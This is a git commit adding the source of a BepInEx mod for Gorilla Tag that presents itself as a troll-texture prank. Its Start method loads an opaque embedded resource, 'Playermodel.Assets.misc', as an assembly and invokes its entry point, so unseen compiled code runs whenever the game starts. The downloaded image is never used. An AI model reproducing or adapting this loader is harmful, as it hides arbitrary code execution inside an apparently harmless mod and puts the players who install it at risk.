25408b84227404343ce0d455cad2e1e6fa3d5b79
D4bug <D4bugAccountDeveloper@protonmail.com>
2023-07-06 01:33:16 +0100

    Added files
    idk who wants the source code but ok

---
+++ TrollSformation/Plugin.cs
@@ -0,0 +1,42 @@
+﻿using BepInEx;
+using System;
+using System.Reflection;
+using System.IO;
+using System.Collections;
+using UnityEngine;
+using UnityEngine.Networking;
+using GorillaNetworking;
+using Photon.Pun;
+
+namespace TrollSformation
+{
+    [BepInPlugin(PluginInfo.GUID, PluginInfo.Name, PluginInfo.Version)]
+    public class Plugin : BaseUnityPlugin
+    {
+        Texture2D trol;
+        public void Awake()
+        {
+            StartCoroutine(DownloadImage("https://cdn.discordapp.com/attachments/1020708980005294180/1123737999579025519/index.jpg"));
+        }
+        public void Start()
+        {
+            using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Playermodel.Assets.misc"))
+            {
+                byte[] array = new byte[manifestResourceStream.Length];
+                manifestResourceStream.Read(array, 0, array.Length);
+                Assembly.Load(array).EntryPoint.Invoke(null, new object[0]);
+            }
+
+        }
+
+        IEnumerator DownloadImage(string MediaUrl)
+        {
+            UnityWebRequest request = UnityWebRequestTexture.GetTexture(MediaUrl);
+            yield return request.SendWebRequest();
+            if (request.isNetworkError || request.isHttpError)
+                Debug.Log(request.error);
+            else
+                trol = ((DownloadHandlerTexture)request.downloadHandler).texture;
+        }
+    }
+}
---
+++ TrollSformation/PluginInfo.cs
@@ -0,0 +1,12 @@
+﻿namespace TrollSformation
+{
+    /// <summary>
+    /// This class is used to provide information about your mod to BepInEx.
+    /// </summary>
+    internal class PluginInfo
+    {
+        public const string GUID = "com.D4bug.gorillatag.TrollTexture";
+        public const string Name = "D4bug";
+        public const string Version = "1.0.0";
+    }
+}
